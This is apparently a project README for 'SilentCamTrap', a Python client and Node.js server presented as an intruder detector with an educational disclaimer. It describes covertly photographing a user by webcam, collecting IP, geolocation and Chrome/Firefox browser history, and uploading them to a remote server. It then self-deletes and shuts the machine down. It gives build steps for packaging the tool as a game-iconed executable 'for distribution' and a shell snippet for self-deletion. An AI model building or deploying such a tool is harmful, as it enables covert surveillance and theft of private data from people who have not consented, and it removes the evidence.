# Intruder Detection and Data Collection System (SilentCamTrap)

## Overview
This project consists of a Python client script that:
- Captures a webcam image.
- Collects additional device data: public IP (external IP, which may be VPN-masked), local network IP (internal LAN IP), approximate real-time location (latitude/longitude via IP geolocation), and browser history (last 10 visits from Chrome and Firefox, if available).
- Saves the image locally.
- Sends the image and collected data to a Node.js server via HTTP POST.
- If successful, deletes the running executable (if compiled) using a platform-specific script and shuts down the device.

The Node.js server receives the image and data, saves the image, logs the data, and responds with success.

**Educational Purpose Disclaimer:**  
This project is intended for educational purposes only. It demonstrates concepts in computer vision, data collection, networking, and scripting. Do not use this software for any illegal, unethical, or unauthorized activities, such as invading privacy, unauthorized data access, or malicious intent. Always obtain explicit consent and comply with local laws when handling personal data. The authors disclaim any liability for misuse.

**Important Notes:**
- This is for educational/security purposes on your own device. Ensure legal compliance for data collection, especially browser history.
- Location is approximate (based on public IP via geolocation API). If VPN is active, it will reflect the VPN's location/IP.
- "Real network IP": We collect both public IP (external, via API) and local IP (internal network). Bypassing VPN for true ISP IP requires advanced techniques (e.g., WebRTC in browsers) not feasible in pure Python without extensions.
- Browser history: Collects from default profiles; may require browser to be closed or handle file copies to avoid locks. Timestamps are raw from databases (Chrome: WebKit time, Firefox: microseconds since UNIX epoch). Paths are Windows-specific; for Linux, update paths in client.py (e.g., Chrome: ~/.config/google-chrome/Default/History, Firefox: ~/.mozilla/firefox/*.default/places.sqlite).
- Dependencies: Install via pip if needed for client.py and building executable; `npm install` for server.js). Standard Python libs handle SQLite and config.
- If running as .py (not executable), deletion targets sys.executable (python executable), which may not be intended! test carefully.
- Security: Use HTTPS in production. Add authentication to the API endpoint.
- Cross-Platform: The script is primarily for Windows. For Linux, modify shutdown command (e.g., 'shutdown -h now'), browser paths, and self-deletion script (use .sh instead of .bat).

## Folder Structure
```
SilentCamTrap/
├── python          
│   ├── game.ico      # Icon file for the executable (add your own ICO file here; works on Windows, optional on Linux)
│   └── client.py      # The Python script for capturing image, collecting data (IP, location, browser histories), and sending to server
├── server/
│   └── server.js      # The Node.js server for receiving the image and data
├── intruder_logs/     # Folder where captured images are saved locally (created automatically by client.py)
├── uploads/           # Folder where server saves received images (created automatically by server.js)
└── README.md          # This documentation file explaining the setup and usage
```

## Building the .exe (Windows)
To compile `client.py` into a standalone executable (.exe) for easier distribution or testing (e.g., as a self-deleting intruder logger), use PyInstaller. This packages the script with all dependencies into a single file.

1. Install PyInstaller if not already: `pip install pyinstaller`.
2. Navigate to the project root (where `client.py` and `game.ico` are).
3. Run the command:
   ```
   pyinstaller --onefile --icon=game.ico client.py
   ```
   - `--onefile`: Creates a single .exe file.
   - `--icon=icon.ico`: Uses the provided ICO file as the executable's icon (optional; skip if no icon needed).
4. The build output will be in the `dist/` folder (e.g., `dist/client.exe`).
5. Test the .exe: Run `dist/client.exe`. It will perform the actions and, if send succeeds, create a batch file to delete itself after a short delay and shut down.
   - Note: If running the .exe, ensure browsers are closed for history access, and test without internet/shutdown first by commenting out relevant lines in `client.py` before building.
   - Common issues: If dependencies fail (e.g., OpenCV), add `--hidden-import=cv2` to the pyinstaller command.

## Building the Executable (Linux)
To compile `client.py` into a standalone executable binary for Linux, use PyInstaller. This creates a single-file binary that can be run without Python installed.

1. Install PyInstaller if not already: `pip install pyinstaller`.
2. Navigate to the project root (where `client.py` is).
3. Run the command:
   ```
   pyinstaller --onefile client.py
   ```
   - `--onefile`: Creates a single executable file.
   - Note: Icons (.ico) are not directly supported on Linux executables; skip `--icon` or convert to a suitable format if needed (PyInstaller on Linux typically doesn't embed icons like Windows).
4. The build output will be in the `dist/` folder (e.g., `dist/client`).
5. Make it executable: `chmod +x dist/client`.
6. Test the binary: Run `./dist/client`. It will perform the actions, but note:
   - Shutdown: Modify `os.system("shutdown /s /t 0")` in `client.py` to `os.system("shutdown -h now")` before building.
   - Self-deletion: The current batch (.bat) is Windows-specific. Update the script creation in `client.py` for Linux, e.g., use a .sh file:
     ```
     sh_path = 'delete.sh'
     with open(sh_path, 'w') as f:
         f.write(f'#!/bin/bash\nsleep 3\nrm -f "{exe_path}"\nsudo shutdown -h now\nrm -f "{sh_path}"')
     subprocess.Popen(['sh', sh_path])
     ```
     - Add `chmod +x delete.sh` if needed.
   - Browser paths: Update in `client.py` for Linux defaults (e.g., Chrome: os.path.expanduser('~/.config/google-chrome/Default/History'), Firefox: find profile in '~/.mozilla/firefox/profiles.ini').
   - Common issues: If dependencies fail (e.g., OpenCV), add `--hidden-import=cv2` to the pyinstaller command. Ensure sudo for shutdown if required.

## Running the Server
1. Navigate to the `server/` folder.
2. Ensure dependencies are installed: `npm install` (if not done).
3. Start the server: `node server.js`.
   - The server will listen on `http://localhost:3000` (or your specified port).
   - It handles POST requests to `/upload`, saving images to `../uploads/` and logging extra data (IP, location, browser history).
4. For production: Host on a server (e.g., Docker, AWS), use HTTPS, and update `api_url` in `client.py` to your public URL.
5. Testing: Use tools like Postman to simulate uploads, or run the client locally.

## Data Collected and Sent
- Image: JPEG from webcam.
- Public IP: External IP (may be VPN if connected).
- Local IP: Internal network IP (e.g., 192.168.x.x).
- Location: Latitude, longitude, city, country (approximate via IP).
- Browser Histories: Last 10 visits from Chrome and Firefox (url, title, timestamp) or errors if unavailable.

## Troubleshooting
- If send fails, no deletion/shutdown occurs; error is printed.
- VPN: Public IP/location will be VPN's. Local IP remains unchanged.
- No internet: Location/IP fetch will fail; data will be marked as error.
- Browser not found: History will show errors.
- Deletion: On Windows, uses batch with timeout; on Linux, adapt to shell script.
- Customize: Edit `api_url` in client.py.
- Executable build fails: Check for missing modules; add `--hidden-import` flags (e.g., `--hidden-import=geocoder`).

## Follow for more
> [Mahmud Rahman](https://github.com/mahmud-r-farhan)